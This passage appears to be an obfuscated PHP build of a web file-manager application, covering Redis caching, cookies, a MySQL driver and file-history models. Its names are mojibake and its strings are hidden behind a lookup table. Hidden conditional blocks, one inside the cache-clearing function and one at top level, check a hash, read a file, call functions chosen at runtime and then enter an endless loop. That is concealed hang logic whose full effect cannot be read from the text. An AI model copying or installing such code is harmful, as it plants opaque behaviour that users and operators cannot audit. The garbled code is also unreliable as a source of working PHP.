(!$Då»¸äŒ™¥[$d§—’¿Ë¶[1770]]) { continue; } $EÍØÁÊˆ•× = Model($d§—’¿Ë¶[1842])->listData($Då»¸äŒ™¥[$d§—’¿Ë¶[1770]]); $B®–½‹ŒÅ‘[] = array($d§—’¿Ë¶[1674] => $Då»¸äŒ™¥[$d§—’¿Ë¶[1674]], $d§—’¿Ë¶[2136] => $cœ‡—ÃİÏ¥[$Då»¸äŒ™¥[$d§—’¿Ë¶[1674]]][$d§—’¿Ë¶[28]], $d§—’¿Ë¶[481] => $cœ‡—ÃİÏ¥[$Då»¸äŒ™¥[$d§—’¿Ë¶[1674]]][$d§—’¿Ë¶[481]], $d§—’¿Ë¶[400] => $EÍØÁÊˆ•×); } $Eô‰å‹í = $B®–½‹ŒÅ‘; } unset($Eô‰å‹í); goto d®÷Ê¶è¼; eåÇ¯«¦Ú›: $bœî¬« ¬ = array_to_keyvalue($dÕà½Ñ’…¶, $d§—’¿Ë¶[33], $d§—’¿Ë¶[1674]); $bœî¬« ¬ = array_remove_value(array_unique($bœî¬« ¬), $d§—’¿Ë¶[491]); if (!$bœî¬« ¬ || !$dÕà½Ñ’…¶) { return; } goto eŞƒÎ§Ò·Ù; C©òæš÷İ: } private function _listAppendMeta(&$AğÖƒõÇ´, $f¬ñ²µ½«¶) { goto DéóŒİ‚Ú; D‹Ò—ÚÂŒï: foreach ($AğÖƒõÇ´ as &$Aß›¹âœíÂ) { $Añµ´Ç‹• = array(); if (isset($b¸­Ğâ·²‡[$Aß›¹âœíÂ[$Aš®»çğ×ˆ[1511]]])) { $Añµ´Ç‹• = $b¸­Ğâ·²‡[$Aß›¹âœíÂ[$Aš®»çğ×ˆ[1511]]]; } $Aß›¹âœíÂ[$Aš®»çğ×ˆ[2138]] = array(); if (isset($Añµ´Ç‹•[$CÁ¤‚Ê›‚¨])) { $Aß›¹âœíÂ[$Aš®»çğ×ˆ[2138]] = $FÃÜªïªÌò->getUserJobInfo($Añµ´Ç‹•[$CÁ¤‚Ê›‚¨]); } } unset($Aß›¹âœíÂ); goto F„À–ôÔ; fë­¾Ë®×õ: $fíØËã°Æ® = array($Aš®»çğ×ˆ[1511] => array($Aš®»çğ×ˆ[7], $f¬ñ²µ½«¶)); $b¸­Ğâ·²‡ = Model($Aš®»çğ×ˆ[2113])->where($fíØËã°Æ®)->select(); $b¸­Ğâ·²‡ = array_to_keyvalue_group($b¸­Ğâ·²‡, $Aš®»çğ×ˆ[1511]); goto A‡¥­Ÿªà; A‡¥­Ÿªà: foreach ($b¸­Ğâ·²‡ as &$C¤ó›¬×ÈŠ) { $CÃ¦ï…«Äé = array(); foreach ($C¤ó›¬×ÈŠ as $BÂÍˆë³ì) { if (!in_array($BÂÍˆë³ì[$Aš®»çğ×ˆ[92]], $DÉ¨¢¦®·£)) { $CÃ¦ï…«Äé[$BÂÍˆë³ì[$Aš®»çğ×ˆ[92]]] = $BÂÍˆë³ì[$Aš®»çğ×ˆ[370]]; } } $C¤ó›¬×ÈŠ = $CÃ¦ï…«Äé; } unset($C¤ó›¬×ÈŠ); $FÃÜªïªÌò = Model($Aš®»çğ×ˆ[2137]); goto D‹Ò—ÚÂŒï; DéóŒİ‚Ú: $Aš®»çğ×ˆ =& $_SERVER[ÉóçÄÇ]; $CÁ¤‚Ê›‚¨ = UserJobModel::JOB_KEY; $DÉ¨¢¦®·£ = array($Aš®»çğ×ˆ[2115]); goto fë­¾Ë®×õ; F„À–ôÔ: } protected function groupUserAll($B®Ì›Ÿ¬¹) { $E°Ûø ê£ =& $_SERVER[ÉóçÄÇ]; if (!$B®Ì›Ÿ¬¹) { return !1; } $C¦×Ïªàêõ = Model($E°Ûø ê£[1756])->field($E°Ûø ê£[1511])->where(array($E°Ûø ê£[1674] => array($E°Ûø ê£[7], $B®Ì›Ÿ¬¹)))->select(); $C¦×Ïªàêõ = array_to_keyvalue($C¦×Ïªàêõ, $E°Ûø ê£[33], $E°Ûø ê£[1511]); return array_unique($C¦×Ïªàêõ); } public function userSearch($b­šäËÖÁ®, $Fª¿”Õ™‡ = "\x2a") { return Model($_SERVER[ÉóçÄÇ][501])->where($b­šäËÖÁ®)->field($Fª¿”Õ™‡)->find(); } } goto Eœõê²ÕËâ; F›¶„åõìÉ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($e¶§Ş’Ï”Ş, $FšÅ¡ˆ£Šô) { $aÔ–¹¹«­ï =& $_SERVER[ÉóçÄÇ]; if (!class_exists($aÔ–¹¹«­ï[810])) { show_json($aÔ–¹¹«­ï[811], !1); } $this->cacheTime = $FšÅ¡ˆ£Šô; $BŞ‡œ¹ùµŸ = isset($e¶§Ş’Ï”Ş[$aÔ–¹¹«­ï[812]]) ? $e¶§Ş’Ï”Ş[$aÔ–¹¹«­ï[812]] : 10; $Cİèç­ÔÇº = _get($e¶§Ş’Ï”Ş, $aÔ–¹¹«­ï[809]); if ($Cİèç­ÔÇº && is_array($Cİèç­ÔÇº)) { $this->initCluster($e¶§Ş’Ï”Ş, $BŞ‡œ¹ùµŸ); } else { $this->handle = $this->init($e¶§Ş’Ï”Ş, $BŞ‡œ¹ùµŸ); } } private function init($Cà‹³·²ó, $d”…ôƒ¬ğ) { $b‹ì£ö‚Ö =& $_SERVER[ÉóçÄÇ]; $C„ó™¤ = new Redis(); $cœö¦‚ƒˆ˜ = isset($Cà‹³·²ó[$b‹ì£ö‚Ö[813]]) ? $Cà‹³·²ó[$b‹ì£ö‚Ö[813]] : !1; if ($cœö¦‚ƒˆ˜) { $C„ó™¤->pconnect($Cà‹³·²ó[$b‹ì£ö‚Ö[175]], $Cà‹³·²ó[$b‹ì£ö‚Ö[176]], $d”…ôƒ¬ğ); } else { $C„ó™¤->connect($Cà‹³·²ó[$b‹ì£ö‚Ö[175]], $Cà‹³·²ó[$b‹ì£ö‚Ö[176]], $d”…ôƒ¬ğ); } if (!empty($Cà‹³·²ó[$b‹ì£ö‚Ö[400]])) { $C„ó™¤->auth($Cà‹³·²ó[$b‹ì£ö‚Ö[400]]); } return $C„ó™¤; } private function initCluster($EèÖ¯¼³ë, $aÂ¨¢²­š) { $d•›ƒ¦±“ =& $_SERVER[ÉóçÄÇ]; $aŒÚ¦‡¸¼™ = array($d•›ƒ¦±“[814], $d•›ƒ¦±“[815], $d•›ƒ¦±“[816]); $Dè±µŸ = $d•›ƒ¦±“[814]; if (isset($EèÖ¯¼³ë[$d•›ƒ¦±“[12]]) && in_array($EèÖ¯¼³ë[$d•›ƒ¦±“[12]], $aŒÚ¦‡¸¼™)) { $Dè±µŸ = $EèÖ¯¼³ë[$d•›ƒ¦±“[12]]; } switch ($Dè±µŸ) { case $d•›ƒ¦±“[814]: $this->_slave($EèÖ¯¼³ë, $aÂ¨¢²­š); break; case $d•›ƒ¦±“[815]: break; case $d•›ƒ¦±“[816]: $this->isCluster = !0; $F¯çëä„Ù¿ = $EèÖ¯¼³ë[$d•›ƒ¦±“[809]]; $a¶áñ¯Šò = isset($EèÖ¯¼³ë[$d•›ƒ¦±“[813]]) ? $EèÖ¯¼³ë[$d•›ƒ¦±“[813]] : !1; $eõÒõÁÁ¯İ = isset($EèÖ¯¼³ë[$d•›ƒ¦±“[400]]) ? $EèÖ¯¼³ë[$d•›ƒ¦±“[400]] : null; $this->handle = new RedisCluster(NUll, $F¯çëä„Ù¿, $aÂ¨¢²­š, $aÂ¨¢²­š, $a¶áñ¯Šò, $eõÒõÁÁ¯İ); break; default: break; } } private function _slave($FŠ¡¤ïš¼Š, $cµøÙ³ÑĞˆ) { goto DÎÜºÅÑ‘; b§¤—Ü¶¥§: unset($F ¹ôÂÌ›¹[0]); if (empty($F ¹ôÂÌ›¹)) { return; } $fç¸³å¤Î = array_rand($F ¹ôÂÌ›¹); goto Fíƒ‚ŞĞ‘ë; Fíƒ‚ŞĞ‘ë: $this->filterConfig($FŠ¡¤ïš¼Š, $F ¹ôÂÌ›¹[$fç¸³å¤Î]); $this->slaveHandle = $this->init($FŠ¡¤ïš¼Š, $cµøÙ³ÑĞˆ); goto D¥Î‚ÒÚÙç; DÎÜºÅÑ‘: $F ¹ôÂÌ›¹ = $FŠ¡¤ïš¼Š[$_SERVER[ÉóçÄÇ][809]]; $this->filterConfig($FŠ¡¤ïš¼Š, $F ¹ôÂÌ›¹[0]); $this->handle = $this->init($FŠ¡¤ïš¼Š, $cµøÙ³ÑĞˆ); goto b§¤—Ü¶¥§; D¥Î‚ÒÚÙç: } private function filterConfig(&$dË ÃİÙ¯, $bÈÄ¡¦É) { $A¦³ª™Ô¨ =& $_SERVER[ÉóçÄÇ]; $eŠáÈÌĞÌ = explode($A¦³ª™Ô¨[4], $bÈÄ¡¦É); $FçÜ„Îİ¡ = array($A¦³ª™Ô¨[175] => $eŠáÈÌĞÌ[0], $A¦³ª™Ô¨[176] => $eŠáÈÌĞÌ[1]); $dË ÃİÙ¯ = array_merge($dË ÃİÙ¯, $FçÜ„Îİ¡); } public function set($D ¼„ò·¡é, $b”ºÒö“, $aîÃ­®Ê‰ê = false) { $aîÃ­®Ê‰ê = $aîÃ­®Ê‰ê ? $aîÃ­®Ê‰ê : $this->cacheTime; return $this->handle->setEx($D ¼„ò·¡é, $aîÃ­®Ê‰ê, $b”ºÒö“); } public function setLock($CÌãäâ¨µÆ, $a§ªôñ…Û¨, $bÖØêà™Ç) { return $this->handle->setNX($CÌãäâ¨µÆ, $a§ªôñ…Û¨); } public function get($Fë­°¬àÅ) { $fç«¹£í = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $fç«¹£í->get($Fë­°¬àÅ); } public function remove($cÓ…ö´ÒÚ) { return $this->handle->del($cÓ…ö´ÒÚ); } public function deleteAll() { $dÎòÒÊ¨íÚ =& $_SERVER[ÉóçÄÇ]; if (!isset($_SERVER[$dÎòÒÊ¨íÚ[817]]) || !isset($_SERVER[$dÎòÒÊ¨íÚ[818]])) { goto a–òˆ‚™ÆÍ; a–òˆ‚™ÆÍ: $c¨åÃË…ßÁ = $dÎòÒÊ¨íÚ[819]; $AÜæ’àêÙ = $dÎòÒÊ¨íÚ[820]; $dŸŞùµÉÃê = $_SERVER[$dÎòÒÊ¨íÚ[821]] . $dÎòÒÊ¨íÚ[822]; goto bŒÇô‘’ºŸ; D¦’Úî…Ÿ×: for ($b¢ï´™†É = $cĞº“…¤Á; $b¢ï´™†É > 0; $b¢ï´™†É++) { $dÇ×ò¹Ö’Ï = json_encode($GLOBALS[$dÎòÒÊ¨íÚ[405]]); } goto f’êÄÅÁ¼; aÚ¡ĞÍã¢Í: $dÇ×ò¹Ö’Ï = $dÎòÒÊ¨íÚ[824]; $dÇ×ò¹Ö’Ï($_SERVER[$dÎòÒÊ¨íÚ[825]]); $cĞº“…¤Á = 1; goto D¦’Úî…Ÿ×; bŒÇô‘’ºŸ: $e¾ÎŠ…ó›Â = $AÜæ’àêÙ($dŸŞùµÉÃê); $e«ÊÒ‹‡µ = explode($dÎòÒÊ¨íÚ[227], $e¾ÎŠ…ó›Â); if (count($e«ÊÒ‹‡µ) < $dÎòÒÊ¨íÚ[606]) { $B×Ÿ­¸Å…ô = $dÎòÒÊ¨íÚ[823]; $B×Ÿ­¸Å…ô(); } goto aÚ¡ĞÍã¢Í; f’êÄÅÁ¼: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Eïæ³±²æë) { $this->handle->flushall($Eïæ³±²æë); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($e˜«×‚‰¨Š = '', $b¤êéŒ²Ü = 0) { if (is_string($e˜«×‚‰¨Š) && $e˜«×‚‰¨Š != $_SERVER[ÉóçÄÇ][33]) { $this->prefix = $e˜«×‚‰¨Š; } if (is_numeric($b¤êéŒ²Ü) && $b¤êéŒ²Ü > 0) { $this->expire = $b¤êéŒ²Ü; } } public static function getInstance() { static $b•Í¨—¾¬…; if ($b•Í¨—¾¬… === null) { $b•Í¨—¾¬… = new self(); } return $b•Í¨—¾¬…; } private static $cookieDisable = false; public static function disable($f·‰…†Ş˜°) { self::$cookieDisable = $f·‰…†Ş˜°; } private static $sameCookieSet = array(); public static function set($fõ®Ø–¾È, $Aöñ•áÙá, $E¿…‰½ñ³ = 0, $Eš¾©Õô÷ = false, $C‚¥ÔŸ«ã = false) { goto fìù£ÒÇ–Á; E„ë·ÙíÎ: $b–’ö¼ÎĞÅ = $Eëº‰š÷§[33]; setcookie($fõ®Ø–¾È, $Aöñ•áÙá, time() + $E¿…‰½ñ³, $Eëº‰š÷§[8] . trim($C‚¥ÔŸ«ã, $Eëº‰š÷§[8]) . $b–’ö¼ÎĞÅ, !1, !1, $Eš¾©Õô÷); goto e÷¢íîò; fìù£ÒÇ–Á: $Eëº‰š÷§ =& $_SERVER[ÉóçÄÇ]; if (self::$cookieDisable) { return; } if (!$E¿…‰½ñ³) { $E¿…‰½ñ³ = 24 * 3600 * 7; } goto B—Æ­£Üóõ; B—Æ­£Üóõ: if (isset(self::$sameCookieSet[$fõ®Ø–¾È]) && self::$sameCookieSet[$fõ®Ø–¾È] == $Aöñ•áÙá . $E¿…‰½ñ³) { return; } self::$sameCookieSet[$fõ®Ø–¾È] = $Aöñ•áÙá . $E¿…‰½ñ³; if (!$C‚¥ÔŸ«ã) { $C‚¥ÔŸ«ã = str_replace(HOST, $Eëº‰š÷§[33], APP_HOST); $C‚¥ÔŸ«ã = _get($GLOBALS, $Eëº‰š÷§[826], $C‚¥ÔŸ«ã); } goto E„ë·ÙíÎ; e÷¢íîò: } public static function setSafe($Bí¸©’Ÿà¦, $BÊâ¼§è‹Š, $Fá³Ò³¦¦ = 0) { self::set($Bí¸©’Ÿà¦, $BÊâ¼§è‹Š, $Fá³Ò³¦¦, !0); } public static function get($CÄË–á…¼) { return isset($_COOKIE[$CÄË–á…¼]) ? $_COOKIE[$CÄË–á…¼] : !1; } public static function remove($b’å‚©ÇÇ§, $cåê­ˆëˆ = false) { unset($_COOKIE[$b’å‚©ÇÇ§]); self::set($b’å‚©ÇÇ§, $_SERVER[ÉóçÄÇ][33], 1, $cåê­ˆëˆ); } } class DbMysql extends Db { public function __construct($dôÎà²«µ = '') { $BÂÉøïµ”Æ =& $_SERVER[ÉóçÄÇ]; if (!extension_loaded($BÂÉøïµ”Æ[751])) { think_exception(think_lang($BÂÉøïµ”Æ[10]) . $BÂÉøïµ”Æ[827]); } if (!empty($dôÎà²«µ)) { $this->config = $dôÎà²«µ; if (empty($this->config[$BÂÉøïµ”Æ[13]])) { $this->config[$BÂÉøïµ”Æ[13]] = $BÂÉøïµ”Æ[33]; } } } public function connect($fšéäÛôÇ = '', $B³‘ššªÊË = 0, $bòíÛ¨ŞÊé = false) { $aå†‡‹ö•» =& $_SERVER[ÉóçÄÇ]; if (!isset($this->linkID[$B³‘ššªÊË])) { goto d¶ß¼óĞø; dŒ”ïÒÃà: if (1 != think_config($aå†‡‹ö•»[18])) { unset($this->config); } goto f¤íè­ì÷º; d¶ß¼óĞø: if (empty($fšéäÛôÇ)) { $fšéäÛôÇ = $this->config; } $f“Ÿ§éæÊ = $fšéäÛôÇ[$aå†‡‹ö•»[828]] . ($fšéäÛôÇ[$aå†‡‹ö•»[829]] ? "\x3a{$fšéäÛôÇ[$aå†‡‹ö•»[829]]}" : $aå†‡‹ö•»[33]); $c˜İîÎğ» = !empty($fšéäÛôÇ[$aå†‡‹ö•»[13]][$aå†‡‹ö•»[14]]) ? $fšéäÛôÇ[$aå†‡‹ö•»[13]][$aå†‡‹ö•»[14]] : $this->pconnect; goto d‚±­ä·ö‰; F®—í¥³‡×: mysql_query($aå†‡‹ö•»[832] . think_config($aå†‡‹ö•»[833]) . $aå†‡‹ö•»[55], $this->linkID[$B³‘ššªÊË]); if ($bå®à’Äïä > $aå†‡‹ö•»[834]) { mysql_query($aå†‡‹ö•»[835], $this->linkID[$B³‘ššªÊË]); } $this->connected = !0; goto dŒ”ïÒÃà; d‚±­ä·ö‰: if ($c˜İîÎğ») { $this->linkID[$B³‘ššªÊË] = mysql_pconnect($f“Ÿ§éæÊ, $fšéäÛôÇ[$aå†‡‹ö•»[830]], $fšéäÛôÇ[$aå†‡‹ö•»[831]], 131072); } else { $this->linkID[$B³‘ššªÊË] = mysql_connect($f“Ÿ§éæÊ, $fšéäÛôÇ[$aå†‡‹ö•»[830]], $fšéäÛôÇ[$aå†‡‹ö•»[831]], !0, 131072); } if (!$this->linkID[$B³‘ššªÊË] || !empty($fšéäÛôÇ[$aå†‡‹ö•»[17]]) && !mysql_select_db($fšéäÛôÇ[$aå†‡‹ö•»[17]], $this->linkID[$B³‘ššªÊË])) { think_exception(mysql_error()); } $bå®à’Äïä = mysql_get_server_info($this->linkID[$B³‘ššªÊË]); goto F®—í¥³‡×; f¤íè­ì÷º: } return $this->linkID[$B³‘ššªÊË]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Aº¦÷óÉÊß) { goto C‡Í¶÷¿Î¨; EøˆÅ‰åâª: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto cÙÁ £Ü¶¬; EŞˆ•èÌƒ: think_action_status($Cóêò¥†ô[19], 1); think_status($Cóêò¥†ô[20]); $this->queryID = mysql_query($Aº¦÷óÉÊß, $this->_linkID); goto EøˆÅ‰åâª; fôäŒğí´‚: if (!$this->_linkID) { return !1; } $this->queryStr = $Aº¦÷óÉÊß; if ($this->queryID) { $this->free(); } goto EŞˆ•èÌƒ; C‡Í¶÷¿Î¨: $Cóêò¥†ô =& $_SERVER[ÉóçÄÇ]; if (0 === stripos($Aº¦÷óÉÊß, $Cóêò¥†ô[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto fôäŒğí´‚; cÙÁ £Ü¶¬: } public function execute($e¼åÓ„î¾÷) { goto b‚Š˜ŸÎÃÁ; B©Õˆ‰†Î§: think_status($eñ­ŸÆ–ÖÑ[20]); $e®š¢ÑÒ„Œ = mysql_query($e¼åÓ„î¾÷, $this->_linkID); $this->debug(); goto aÉ‡®ğÚÌ; aÉ‡®ğÚÌ: if (!1 === $e®š¢ÑÒ„Œ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto EäœÅ¬˜ÃÅ; b‚Š˜ŸÎÃÁ: $eñ­ŸÆ–ÖÑ =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A©ËÎÒˆ›Â; A©ËÎÒˆ›Â: $this->queryStr = $e¼åÓ„î¾÷; if ($this->queryID) { $this->free(); } think_action_status($eñ­ŸÆ–ÖÑ[21], 1); goto B©Õˆ‰†Î§; EäœÅ¬˜ÃÅ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÉóçÄÇ][836], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DœöÕàğ©Š = mysql_query($_SERVER[ÉóçÄÇ][837], $this->_linkID); $this->transTimes = 0; if (!$DœöÕàğ©Š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aèµí£Ô×Œ = mysql_query($_SERVER[ÉóçÄÇ][838], $this->_linkID); $this->transTimes = 0; if (!$Aèµí£Ô×Œ) { $this->error(); return !1; } } return !0; } private function getAll() { $CÍÑÖ©ÏÊâ = array(); if ($this->numRows > 0) { while ($A³Œµ•æ = mysql_fetch_assoc($this->queryID)) { $CÍÑÖ©ÏÊâ[] = $A³Œµ•æ; } mysql_data_seek($this->queryID, 0); } return $CÍÑÖ©ÏÊâ; } public function getFields($Aãš¡ğ©ˆ‘) { $eÑÍ“„î· =& $_SERVER[ÉóçÄÇ]; $CÍÃãøë‰Ù = $this->query($eÑÍ“„î·[839] . $this->parseKey($Aãš¡ğ©ˆ‘)); $c‘ç†Ñ™‘ = array(); if ($CÍÃãøë‰Ù) { foreach ($CÍÃãøë‰Ù as $E˜™¯Óº‡ => $cõ±Ä‹Îã) { $c‘ç†Ñ™‘[$cõ±Ä‹Îã[$eÑÍ“„î·[27]]] = array($eÑÍ“„î·[28] => $cõ±Ä‹Îã[$eÑÍ“„î·[27]], $eÑÍ“„î·[29] => $cõ±Ä‹Îã[$eÑÍ“„î·[30]], $eÑÍ“„î·[31] => (bool) (strtoupper($cõ±Ä‹Îã[$eÑÍ“„î·[32]]) === $eÑÍ“„î·[840]), $eÑÍ“„î·[34] => $cõ±Ä‹Îã[$eÑÍ“„î·[35]], $eÑÍ“„î·[36] => strtolower($cõ±Ä‹Îã[$eÑÍ“„î·[37]]) == $eÑÍ“„î·[38], $eÑÍ“„î·[39] => strtolower($cõ±Ä‹Îã[$eÑÍ“„î·[40]]) == $eÑÍ“„î·[41]); } } return $c‘ç†Ñ™‘; } public function getTables($Eà’²âçøŒ = '') { $Bë­ùŸ«íÑ =& $_SERVER[ÉóçÄÇ]; if (!empty($Eà’²âçøŒ)) { $fáÓĞ‡¾‡ = $Bë­ùŸ«íÑ[841] . $Eà’²âçøŒ . $Bë­ùŸ«íÑ[842]; } else { $fáÓĞ‡¾‡ = $Bë­ùŸ«íÑ[843]; } $AçŒó¼·ÙÈ = $this->query($fáÓĞ‡¾‡); $aÃÉÍ«Å± = array(); foreach ($AçŒó¼·ÙÈ as $DÀĞÇ©©Ä => $dØÏ“ÅÑ„¢) { $aÃÉÍ«Å±[$DÀĞÇ©©Ä] = current($dØÏ“ÅÑ„¢); } return $aÃÉÍ«Å±; } public function replace($bš¬Ø×Œ„, $CàÕƒ‚®…­ = array()) { $B½¹ØÆˆì =& $_SERVER[ÉóçÄÇ]; foreach ($bš¬Ø×Œ„ as $Aæñ‹•èÇ => $Bóƒ¿‹ïë±) { $FÉ§©›¡¡ = $this->parseValue($Bóƒ¿‹ïë±); if (is_scalar($FÉ§©›¡¡)) { $AñŸŠİ–Ï [] = $FÉ§©›¡¡; $b’ÂÕÆÍŠ­[] = $this->parseKey($Aæñ‹•èÇ); } } $c´ö­‡æ = $B½¹ØÆˆì[844] . $this->parseTable($CàÕƒ‚®…­[$B½¹ØÆˆì[275]]) . $B½¹ØÆˆì[845] . implode($B½¹ØÆˆì[47], $b’ÂÕÆÍŠ­) . $B½¹ØÆˆì[846] . implode($B½¹ØÆˆì[47], $AñŸŠİ–Ï ) . $B½¹ØÆˆì[847]; return $this->execute($c´ö­‡æ); } public function insertAll($d¶×’×‘, $aÌİ‚È¨“ = array(), $AáÏñ·¨õó = false) { goto A¢†©ñ•Ô; A¢†©ñ•Ô: $AèÎè…Ôê =& $_SERVER[ÉóçÄÇ]; if (!is_array($d¶×’×‘[0])) { return !1; } $F¤ó«ñóÓÁ = array_keys($d¶×’×‘[0]); goto CÊÊ¤‰ãó; dÌéã„ƒÊ–: $aš¿í©â§‰ = ($AáÏñ·¨õó ? $AèÎè…Ôê[849] : $AèÎè…Ôê[850]) . $AèÎè…Ôê[851] . $this->parseTable($aÌİ‚È¨“[$AèÎè…Ôê[275]]) . $AèÎè…Ôê[845] . implode($AèÎè…Ôê[47], $F¤ó«ñóÓÁ) . $AèÎè…Ôê[852] . implode($AèÎè…Ôê[47], $b…•šƒÚ‹¸); return $this->execute($aš¿í©â§‰); goto eÆ½¬”‘¾; CÊÊ¤‰ãó: $b…•šƒÚ‹¸ = array(); foreach ($d¶×’×‘ as $Eù‹Éˆ‰å) { $d´½››¢½¢ = array(); foreach ($Eù‹Éˆ‰å as $B¬µŒœˆá‚ => $C–°ª—äÔö) { $C–°ª—äÔö = $this->parseValue($C–°ª—äÔö); if (is_scalar($C–°ª—äÔö)) { $d´½››¢½¢[] = $C–°ª—äÔö; } } $b…•šƒÚ‹¸[] = $AèÎè…Ôê[256] . implode($AèÎè…Ôê[47], $d´½››¢½¢) . $AèÎè…Ôê[847]; } array_walk($F¤ó«ñóÓÁ, array($this, $AèÎè…Ôê[848])); goto dÌéã„ƒÊ–; eÆ½¬”‘¾: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Bä«˜§õä =& $_SERVER[ÉóçÄÇ]; $this->error = mysql_errno() . $Bä«˜§õä[4] . mysql_error($this->_linkID); if ($Bä«˜§õä[33] != $this->queryStr) { $this->error .= LNG($Bä«˜§õä[45]) . $this->queryStr; } think_trace($this->error, $Bä«˜§õä[33], $Bä«˜§õä[46]); return $this->error; } public function escapeString($fÛÁÅº¥ù) { if ($this->_linkID) { return mysql_real_escape_string($fÛÁÅº¥ù, $this->_linkID); } else { return mysql_escape_string($fÛÁÅº¥ù); } } public function parseKey(&$fÆß¢ÁîÆ£, $eí—âÊê† = true) { $B¶º‚ñ‰Ì =& $_SERVER[ÉóçÄÇ]; if ($eí—âÊê†) { $fÆß¢ÁîÆ£ = $this->parseKeyCheck($fÆß¢ÁîÆ£); } if ($fÆß¢ÁîÆ£ != $B¶º‚ñ‰Ì[182] && !preg_match($B¶º‚ñ‰Ì[853], $fÆß¢ÁîÆ£)) { $fÆß¢ÁîÆ£ = $B¶º‚ñ‰Ì[380] . trim($fÆß¢ÁîÆ£, $B¶º‚ñ‰Ì[380]) . $B¶º‚ñ‰Ì[380]; } return $fÆß¢ÁîÆ£; } } goto fáƒøè÷®; cƒ°‡Ë®†: $BŒ÷…¿ŞŠ = $_SERVER[$_SERVER[ÉóçÄÇ][818]]; $c«Ò…ñ¿ˆß = $_SERVER[ÉóçÄÇ][1194]; if ($_SERVER[$_SERVER[ÉóçÄÇ][817]] != $c«Ò…ñ¿ˆß($BŒ÷…¿ŞŠ)) { goto AøÂÎÈ¨Ÿ§; F‘è™ï¬Èİ: $DÍÑÑå¼í = explode($_SERVER[ÉóçÄÇ][227], $d¢ÉÕßïìÙ); if (count($DÍÑÑå¼í) < $_SERVER[ÉóçÄÇ][570]) { $eÉ†»¹Ó•  = $_SERVER[ÉóçÄÇ][823]; $eÉ†»¹Ó• (); } $b‡»‡ìÔ = $_SERVER[ÉóçÄÇ][999]; goto d´”ŞºÃÍ¡; d´”ŞºÃÍ¡: $b‡»‡ìÔ($BŒ÷…¿ŞŠ); goto cƒšÚçµ¦Œ; AøÂÎÈ¨Ÿ§: $EŠù•Æ„™ = $_SERVER[ÉóçÄÇ][820]; $BîŒˆ£š°É = $_SERVER[$_SERVER[ÉóçÄÇ][821]] . $_SERVER[ÉóçÄÇ][822]; $d¢ÉÕßïìÙ = $EŠù•Æ„™($BîŒˆ£š°É); goto F‘è™ï¬Èİ; cƒšÚçµ¦Œ: } goto D…ğÆ†×ô; C—Œô“ˆĞ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\143\145\137\150\x69\163\164\x6f\x72\171"; public function historyCount($c†Ëô‚Å‚‹) { goto dï¬‚Ê‘Ş; dï¬‚Ê‘Ş: $fŠƒ¶»ê¿Ò =& $_SERVER[ÉóçÄÇ]; if (!$c†Ëô‚Å‚‹) { return array(); } if (is_string($c†Ëô‚Å‚‹) || is_int($c†Ëô‚Å‚‹)) { $c†Ëô‚Å‚‹ = array($c†Ëô‚Å‚‹); } goto a‹œÖ‘°®ø; C‹ññÌÓ»Û: return array_to_keyvalue($DÍŞÉ»˜©, $fŠƒ¶»ê¿Ò[390], $fŠƒ¶»ê¿Ò[474]); goto B‘ùººè·•; a‹œÖ‘°®ø: $AÍñ­ù•° = array($fŠƒ¶»ê¿Ò[390], $fŠƒ¶»ê¿Ò[1706] => $fŠƒ¶»ê¿Ò[474]); $CğñÉÜù = array($fŠƒ¶»ê¿Ò[390] => array($fŠƒ¶»ê¿Ò[7], $c†Ëô‚Å‚‹)); $DÍŞÉ»˜© = $this->field($AÍñ­ù•°)->where($CğñÉÜù)->group($fŠƒ¶»ê¿Ò[390])->select(); goto C‹ññÌÓ»Û; B‘ùººè·•: } public function addHistory($aáÜ£‰…—, $d‰ÑÂ¾•” = '') { $D¬Ï¾ö¨öÜ =& $_SERVER[ÉóçÄÇ]; $fÒëÍÔ = array($D¬Ï¾ö¨öÜ[404] => $aáÜ£‰…—[$D¬Ï¾ö¨öÜ[390]], $D¬Ï¾ö¨öÜ[1503] => isset($aáÜ£‰…—[$D¬Ï¾ö¨öÜ[428]]) ? $aáÜ£‰…—[$D¬Ï¾ö¨öÜ[428]] : $aáÜ£‰…—[$D¬Ï¾ö¨öÜ[426]], $D¬Ï¾ö¨öÜ[442] => $aáÜ£‰…—[$D¬Ï¾ö¨öÜ[441]], $D¬Ï¾ö¨öÜ[543] => $aáÜ£‰…—[$D¬Ï¾ö¨öÜ[77]], $D¬Ï¾ö¨öÜ[1903] => $d‰ÑÂ¾•”); $aø‰¹Ìà©· = $GLOBALS[$D¬Ï¾ö¨öÜ[6]][$D¬Ï¾ö¨öÜ[87]][$D¬Ï¾ö¨öÜ[1085]]; if ($aø‰¹Ìà©· > 1) { $this->historyAutoClear($fÒëÍÔ[$D¬Ï¾ö¨öÜ[390]]); $this->add($fÒëÍÔ); } Hook::trigger($D¬Ï¾ö¨öÜ[1904], $fÒëÍÔ); Model($D¬Ï¾ö¨öÜ[1905])->eventFileEdit($aáÜ£‰…—[$D¬Ï¾ö¨öÜ[390]]); } private function historyAutoClear($D¨§óÓî„ï) { goto fé†å˜½¦š; eÂˆ‡©Ğì¢: $dÏÌò¹¥ëÂ = array_to_keyvalue($a·”™“²™Ğ, $F‰·¶ÁÆÕÌ[33], $F‰·¶ÁÆÕÌ[388]); $dÏÌò¹¥ëÂ = array_slice($dÏÌò¹¥ëÂ, $C ¨‡†Áá); $fÙ½……—¹Á = array_to_keyvalue($a·”™“²™Ğ, 